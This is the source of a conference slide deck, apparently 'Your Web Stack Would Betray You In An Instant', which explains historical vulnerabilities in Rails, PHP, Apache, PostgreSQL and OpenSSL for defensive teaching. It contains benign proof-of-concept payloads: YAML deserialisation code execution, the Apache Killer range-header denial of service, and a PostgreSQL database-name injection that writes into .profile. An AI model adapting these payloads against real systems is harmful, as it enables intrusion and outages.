doctype html
html
  head
    meta(charset='utf-8')
    meta(name='viewport', content='width=device-width, initial-scale=1, maximum-scale=1')
    title Your Web Stack Would Betray You In An Instant

    // build:css styles/styles.css
    //- Check out 'src/bower_components/prism/themes/' for available themes
    link(rel='stylesheet', type='text/css', href='bower_components/prism/themes/prism-tomorrow.css')
    link(rel='stylesheet', type='text/css', href='styles/defaults.css')
    link(rel='stylesheet', type='text/css', href='styles/main.css')
    // endbuild

  body

    article

      section
        h1.title Your Web Stack Would Betray You In An Instant
        address.vcard
          div.author.fn Tim Perry
          div.note.bio
            span Tech Lead &amp; Open-Source Champion at 
            span.org.vcard
              a.org.fn.url(href='http://softwire.com',rel="group") Softwire
          ul.urls
            li
              a.url(href='http://tim-perry.co.uk',rel="me") tim-perry.co.uk
            li
              a.nickname.url(href='http://twitter.com/pimterry',rel="me") @pimterry
            li
              a.url(href='http://github.com/pimterry',rel="me") github.com/pimterry

      section
        h2 Security
        aside
          ul
            li Want to talk about security
            li Security = attackers on the internet trying to mess with your web app
            li Any site with reasonable traffic is worth attacking
            li Platform for attacks, phishing, virus distribution

      section
        h2 Your Web Application:

        ul.stack
          li Your Code
          li Web Framework
          li Programming Language
          li Web Server
          li Database
          li Network Transport

        aside
          ul
            li This is you
            li Walk through each

      section
        h2 Everything is insecure
        
        aside
          ul
            li Bit of a spoiler
            li Whole point of the talk
            li Security is hard
            li You're not going to do it perfectly
            li Even the big boys fail occasionally
            li You can do it well enough
            li Inevitable failure means that it's more about minimizing risk + potential damage
            li Software is complicated, and there's lots of attackers
            li Not as bad as it sounds

      section
        h2 Things that will be loudly publically insecure:

        ul.stack
          li.lowlight Your Code
          li Web Framework
          li Programming Language
          li Web Server
          li Database
          li Network Transport        

        aside
          ul
            li Upside to this
            li When you go wrong, nobody cares
            li There's probably very few people looking

            li Do care about popular common tools
            li Many people looking
            li Vulnerabilities become instantly well known and abused
            li This talk is not about your code
            li It's about the large amounts of shared code that you're using
            li Makes you vulnerable to bugs that are not your fault

            li I want to talk about some of these
            li how they work
            li why people got bitten
            li what you can do to avoid this

      section
        h2.full-slide Ruby on Rails

        ul.stack.corner
          li.lowlight Your Code
          li Web Framework
          li.lowlight Programming Language
          li.lowlight Web Server
          li.lowlight Database
          li.lowlight Network Transport

        aside
          ul
            li Start with rails
            li Popular web framework
            li Easy to quickly build applications
            li Automatically handles lot of complexity for you
            li On top of Ruby the language

      section
        h2 YAML

        pre
          code.language-yaml.
            ---
            name: "Tim Perry"
            company: "Softwire"
            speaking: Yes
            ears:
             - "Left"
             - "Right"
        aside
          ul
            li Detour first
            li Very popular in the Ruby world
            li Yet Another Markup Language
            li Config, serialization
            li *Mostly compatible* with JSON
            li *Optional braces*
            li Numbers, booleans, integers
            li Docs delimited by these triple -
            li Supports lots of extra complexity

      section
        h2 YAML

        pre
          code.language-yaml.
            --- !ruby/hash:User
            name: "Tim Perry"
            company: "Softwire"
            speaking: Yes
            ears:
             - "Left"
             - "Right"
        aside
          ul
            li One thing it supports is types
            li User, as a hash/dict/map
            li Default Ruby YAML parser will build a User when this is parsed

      section
        h2 YAML
        pre
          code.language-ruby.
            user = User.allocate
            values.each_pair { |key,val|
                user[key] = val
            }
        aside
          ul
            li Allocate is not constructor
            li Set key-values for each prop, name/company etc
            li Weird: parsing process actively involved in your code
            li Not just weird: because you can override property setting
            li Key, Value and class are user controller 
            li Dangerous: if key/value's ever used for anything...

      section
        h2 NamedRouteCollection
        pre
          code.language-ruby.
            alias []= add

            def add(name, route)
              ...
              @module.module_eval(
                "remove_possible_method :\#{name}; ..."
              )
              ...
            end
        aside
          ul
            li Builtin Rails class
            li \#{name} is string replacement syntax in Ruby
            li Classic eval-injection attack

      section
        h2 NamedRouteCollection
        pre
          code.language-ruby.
            name = "ignored; puts 'Hello'; \n__END__\n"            

            @module.module_eval(
              "remove_possible_method :\#{name}; ..."
            )

            # Becomes:

            @module.module_eval(
              "remove_possible_method :ignored; puts 'Hello'; 
               __END__
               ..."
            )
        aside
          ul 
            li This runs 'puts hello'
            li puts = print
            li Works because __END__ exists
            li Terminates a chunk of code prematurely
            
      section
        h2 Arbitrary Code Execution with YAML
        pre
          code.language-yaml.
            --- !ruby/hash:NamedRouteCollection
            "ignored; puts 'Hello'; \n__END__\n": 
                !ruby/object:OpenStruct 
                  ‘table’: {‘defaults’: {}}
        p (Namespaces omitted)
        aside
          ul
            li YAML equivelant
            li Need openstruct for validation
            li If Rails parses this, you win
            li But somehow you need to get Rails to parse this
            li Early last year, that got really easy

      section
        h2 Rails
        h4 CVE-2013-0156
        pre
          code.language-yaml.
            &lt;?xml version="1.0"?&gt;
            &lt;foo type='yaml'&gt;
              --- !ruby/hash:NamedRouteCollection
              "ignored; puts 'Hello'; \n__END__\n":
                  !ruby/object:OpenStruct
                    'table': {'defaults': {}}
            &lt;/foo&gt;
        aside
          ul
            li Rails has a lot of convenient features
            li Default: Endpoints can take data in JSON or XML
            li XML elements can be typed, as here
            li YAML is a valid type, for some ungodly reason
      section
        h2 Rails
        h4 CVE-2013-0333
        pre
          code.language-yaml.
            Content-Type: application/json

            --- !ruby/hash\u003aNamedRouteCollection
            "ignored; puts 'Hello'; \n__END__\n":
                !ruby/object\u003aOpenStruct
                  'table': {'defaults': {}}
        aside
          ul
            li Two weeks later, another one
            li Default JSON parser is really just YAML
            li Intended to use YAML internally
            li But actually doesn't parse JSON and restructure
            li Couple of search and replaces and hopes for the best
            li No consideration of security at all
            li Replaces date strings with YAML date literals for convenience            
            li Adds a space after colons, because that's required in YAML
            li Then does unicode replacement too, afterwards

      section
        h2 Rails
        h4 CVE-2013-0277
        pre
          code.language-ruby.
            class BlogPost &lt; ActiveRecord::Base
              :serialize tags
            end
    
      section
        h2.full-slide Ouch

        aside
          ul
            li Pretty painful for Rails developers
            li 3 times in two months
            li Repeated nights of no sleep redeploying everything before they got hacked
            li All that work was not for nothing though
            li I for example got a great example out of it
            li And you get some useful lessons

      section
        h2.full-slide Fear user input
        h3 (in any format)
        aside
        ul
          li Limit what input you accept
          li Tools will may assume their input is safe
          li Powerful formats: both YAML and XML, but JSON mostly safe

      section
        h2.full-slide PHP 

        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li Programming Language
          li.lowlight Web Server
          li.lowlight Database
          li.lowlight Network Transport

      section
        h2 PHP
        pre
          code.language-php.
            $user = new User();
            $user-&gt;username = $_POST['username'];

            $hashedPassword = crypt($_POST['password'], $salt);
            $user-&gt;password = $hashedPassword;

            $user-&gt;save();
        p (Salt generation and all validation omitted)
        aside
          ul
            li Validation!
            li Salt is unique per user
            li But same salt for every login

      section
        h2 PHP
        pre
          code.language-php.
            $salt = $user-&gt;password;
            $hashedPasswordInput = crypt($_POST['password'], $salt);

            $loginOk = ($user-&gt;password === $hashedPasswordInput);
        aside
          ul
            li Convenient feature though: salt is included in password
            li This is the recommended way of handling this
            li Separated by a $
      section
        h2 PHP 5.3.7
        pre(style='font-size: 24px')
          code.language-c.

          span(style='color: #f77')
            code.language-c.
            | - strncat(passwd, "$", 1);

          br
          span(style='color: #7f7')
            code.language-c.
            | + strlcat(passwd, "$", 1);
        aside
          ul
            li N appends string of given length, and null-terminates
            li L takes a total length, and ensures it's null terminated
            li Means that the second one always just sets passwd to be an empty string
            li Linting fix, for security reasons
            li Fixed another important security issue
            li Recommended for immediate update for 5 days

      section
        h2 Strings
        img(src='images/modern-string.png',
          style='width: 560px; margin: 30px 0 0 -35px')

      section.instant
        h2 Strings
        img(src='images/modern-string-details.png',
          style='width: 560px; margin: 30px 0 0 -35px')

      section.instant
        h2 Strings
        img(src='images/c-string.png',
          style='width: 560px; margin: 30px 0 0 -35px')

      section
        h2 PHP 5.3.7
        pre(style='font-size: 24px')
          code.language-c.

          span(style='color: #f77')
            code.language-c.
            | - strncat(passwd, "$", 1);

          br
          span(style='color: #7f7')
            code.language-c.
            | + strlcat(passwd, "$", 1);

      section
        pre(style='font-size: 200%;')
          code.language-c.
            strncat(passwd, "$", 1)
        img(src='images/strncat.svg',
          style='width: 500px; margin: 30px')

      section.instant
        pre(style='font-size: 200%;')
          code.language-c.
            strlcat(passwd, "$", 1)

      section.instant
        pre(style='font-size: 200%;')
          code.language-c.
            strlcat(passwd, "$", 1)
        img(src='images/strlcat.svg',
          style='width: 500px; margin: 30px')

      section
        h2 PHP 5.3.7
        h4 CVE-2011-3189
        pre
          code.language-php.
            crypt($password, $salt) === $salt
      section
        h2 PHP 5.3.7
        h4 CVE-2011-3189
        pre
          code.language-php.
            $salt = $user-&gt;password;
            $hashedPasswordInput = crypt($_POST['password'], $salt);

            $loginOk = ($user-&gt;password === $hashedPasswordInput);
      section.instant
        h2 PHP 5.3.7
        h4 CVE-2011-3189
        pre
          code.language-php.
            $salt = $user-&gt;password;
            $hashedPasswordInput = $salt;

            $loginOk = ($user-&gt;password === $hashedPasswordInput);
      section.instant
        h2 PHP 5.3.7
        h4 CVE-2011-3189
        pre
          code.language-php.
            $loginOk = ($user-&gt;password === $user-&gt;password);
      section
        h2 Tests?
      section
        h2 Reported?

      section
        h2.full-slide Best Practices Matter

      section
        h2.full-slide Apache
        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li.lowlight Programming Language
          li Web Server
          li.lowlight Database
          li.lowlight Network Transport

      section
        h2 HTTP Range Headers
        pre
          code.language-bash.
            GET /video.mp4 HTTP/1.1
            Range: bytes=0-100

            HTTP/1.1 206 Partial Content
            Content-Type: video/mp4
            Content-Length: 101
            Accept-Ranges: bytes
            Content-Range: bytes 0-100/123456

            &#65533;&#65533;&#65533;123&#65533;asdasd&#65533;89&#65533;2&#65533;b&#65533;B%99D[...]

      section
        h2 HTTP Range Headers
        pre(style='padding: 10px 20px !important')
          code.language-bash.
            GET /video.mp4 HTTP/1.1
            Range: bytes=0-100,200-300

            HTTP/1.1 206 Partial Content
            Content-Type: multipart/byteranges; boundary=qwe123
            Content-Length: 330
            Accept-Ranges: bytes
            
            --qwe123
            Content-Type: video/mp4
            Content-Range: bytes 0-100/123456
            
            &#65533;&#65533;&#65533;123&#65533;asdasd&#65533;89&#65533;2&#65533;b&#65533;B%99D[...]
            --qwe123
            Content-Type: video/mp4
            Content-Range: bytes 200-300/123456

            &#65533;&#65533;&#65533;&#65533;9d0cd&#65533;FFFFF?!FFFF&#65533;&#65533;&#65533;"X[...]
        aside

      section
        h2 Apache
        h4 Apache Killer (CVE-2011-3192)

        pre
          code.language-bash.
            HEAD /video.mp4 HTTP/1.1
            Range: bytes=0-,0-1,0-2,0-3,0-4,0-5,0-6,0-7,0-8,0-9,
              0-10,0-11,0-12,0-13,0-14,0-10,0-16,0-17,0-18,[...]
              0-1294,0-1295,0-1296,0-1297,0-1298,0-1299
            Accept-Encoding: gzip

            ...
        aside
          ul
            li Request many overlapping ranges
            li 8KB per header: 1299 ranges
            li Expensive on IIS
            li + large TCP window, to extend the damage
            li Apache implementation creates n^2 buckets to hold per-range data, not n
            li GZIP is not required, but adds extra hurt too
            li Uses all the CPU and memory of a server fairly quickly
            li Your code: watch out for non-linear unbounded complexity from user input

      section
        h2.full-slide
          | Features
          br
          | Add Risk

      section
        h2.full-slide PostgreSQL
        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li.lowlight Programming Language
          li.lowlight Web Server
          li Database
          li.lowlight Network Transport
      
      section
        h2 Postgres
        pre
          code.language-bash.
            psql --host="example.com" \
                 --dbname="blogdb"
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            psql --host="example.com" \
                 --dbname="-r/var/lib/postgres/data/db"
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            no pg_hba.conf entry for host "example.com", 
              user "postgres", database "-r/var/lib/postgres/data/db"
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            psql --host="example.com" \
                 --dbname="-r/var/lib/postgres/.profile" \
                 --username="
                 echo 'Hello' #"
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            $ cat .profile
            [...]
            no pg_hba.conf entry for host "example.com", user "
            echo 'Hello' #", database "-r/var/lib/postgres/.profile"

        pre
          code.language-bash.
            $ su - postgres
            no: command not found
            Hello
      section
        h2.full-slide Isolate Your Infrastructure
        p (And everything else)
        aside
          ul
            li No auth required
            li Filtering in Postgres wouldn't've worked
            li Only safe with a hard firewall in the way
            li Don't rely on one single point of failure for security
            li Huge problems for Heroku etc

      section
        h2 OpenSSL
        h4 Heartbleed (CVE-2014-0160)

        img(src='/images/heartbleed.svg',height=350)
        
        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li.lowlight Programming Language
          li.lowlight Web Server
          li.lowlight Database
          li Network Transport

      section
        h2 OpenSSL
        h4 Heartbleed (CVE-2014-0160)
        pre
          code.language-c.
            // Read payload length into 'payload' var
            n2s(requestBuffer, payload);

            // Allocate memory for the response
            responseBuffer = OPENSSL_malloc(1 + 2 + payload + padding);

            // Write payload length to response buffer
            s2n(payload, responseBuffer);

            // Copy 'payload' bytes from request buffer to response
            memcpy(responseBuffer, requestBuffer, payload);
        p (Some variable names changed for clarity)
        aside
          ul
            li Payload var naming
            li Memcpy
            li OPENSSL_malloc

      section
        h2 Tarsnap
        h4 Heartbleed (CVE-2014-0160)
        aside
          ul
            li Using SSL
            li Actually an old version so safe anyway
            li Would've been fairly safe regardless
            li Secret data is not directly accessible from traffic
            li SSL terminated separately from server, and then forwarded

      section
        h4 Nothing is really secure, but
        h2.full-slide Don't Panic
        ul.conclusions
          li Be very cautious around user input (in any format)
          li Pay attention to good software development practices
          li Turn off or limit unnecessary features wherever possible
          li Isolate your components from one another, and the world
          li <strong>Watch for security notices, and be ready to update <em>fast</em></strong>

      section
        h2 The also rans:

        ul
          li <strong>Node.JS</strong>: Cross-request header stealing <br/>(CVE-2012-2330)
          li <strong>Python</strong>: Remote code execution via builtin socket receive function <br/>(CVE-2014-1912)
          li <strong>GCC</strong>: Optimizations remove checks required to avoid overflow exploits<br/>(CVE-2009-1897)
          li <strong>WebSockets</strong>: Security bug in initial spec, when used with caching proxies
          li <strong>SSL/TLS</strong>: BEAST/CRIME/BREACH attacks against SSL and TLS<br/>(CVE-2011-3389, CVE-2012-4929, CVE-2013-3587)
          li <strong>MongoDB</strong>: Overflow exploits, crashing servers with a single request <br/>(CVE-2012-6619, CVE-2013-2132) 
          li <strong>RubyGems</strong>: YAML exploit gave an external user full access to the repo
          li <strong>NPM</strong>: Full disk exposure on NPM server with a maliciously crafted URL       

      section
        h2.full-slide Any questions?

        aside
          ul
            li C# stack: Windows!
            li DOS via a specific IPv6 packet
            li XMLDOM ActiveX control in every windows up to 8.1 is vulnerable to bil laughs
            li Mostly fairly stable otherwise, main attacks tend to be ActiveX component leftovers
            li Java: 35 remotely exploitable vulns fixed this month's Java SE release
            li 4 exploits rated 10/10, but no details, includes many in JAX-WS etc
        

    // build:js scripts/scripts.js
    script(src='bower_components/bespoke.js/dist/bespoke.min.js')
    script(src='bower_components/bespoke-keys/dist/bespoke-keys.min.js')
    script(src='bower_components/bespoke-touch/dist/bespoke-touch.min.js')
    script(src='bower_components/bespoke-scale/dist/bespoke-scale.min.js')
    script(src='bower_components/bespoke-hash/dist/bespoke-hash.min.js')
    script(src='bower_components/bespoke-state/dist/bespoke-state.min.js')
    script(src='bower_components/bespoke-convenient/dist/bespoke-convenient.js')
    script(src='bower_components/bespoke-indexfinger/dist/bespoke-indexfinger.js')
    script(src='bower_components/bespoke-secondary/dist/bespoke-secondary.js')
    script(src='bower_components/prism/prism.js')
    script(src='bower_components/prism/components/prism-ruby.js')
    script(src='bower_components/prism/components/prism-php.js')
    script(src='bower_components/prism/components/prism-c.js')
    script(src='bower_components/prism/components/prism-bash.js')
    script(src='scripts/prism-yaml.js')
    script(src='scripts/main.js')
    // endbuild
